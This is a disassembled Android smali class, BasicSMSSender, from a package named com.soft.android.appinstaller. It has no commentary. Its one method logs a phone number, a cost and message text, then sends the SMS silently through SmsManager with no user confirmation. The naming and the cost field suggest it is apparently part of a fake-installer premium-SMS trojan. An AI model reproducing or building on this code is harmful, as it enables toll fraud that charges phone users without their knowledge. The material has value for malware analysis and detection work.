.class public Lcom/soft/android/appinstaller/sms/BasicSMSSender;
.super Ljava/lang/Object;
.source "BasicSMSSender.java"


# static fields
.field private static final tag:Ljava/lang/String; = "BasicSMSSender"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public SendMessage(Landroid/content/Context;Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V
    .locals 9
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "sms"    # Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    .prologue
    const/4 v2, 0x0

    const/4 v8, 0x0

    .line 14
    const-string v5, "BasicSMSSender"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Sending sms;  number="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getNumber()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " cost="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getCost()I

    move-result v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " data="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {p2}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getData()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 15
    invoke-virtual {p2}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getData()Ljava/lang/String;

    move-result-object v3

    .line 16
    .local v3, "text":Ljava/lang/String;
    invoke-virtual {p2}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getNumber()Ljava/lang/String;

    move-result-object v1

    .line 17
    .local v1, "number":Ljava/lang/String;
    new-instance v5, Landroid/content/Intent;

    const-class v6, Landroid/content/Context;

    invoke-direct {v5, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v8, v5, v8}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 18
    .local v4, "pi":Landroid/app/PendingIntent;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .local v0, "smsManager":Landroid/telephony/SmsManager;
    move-object v5, v2

    .line 19
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 20
    return-void
.end method
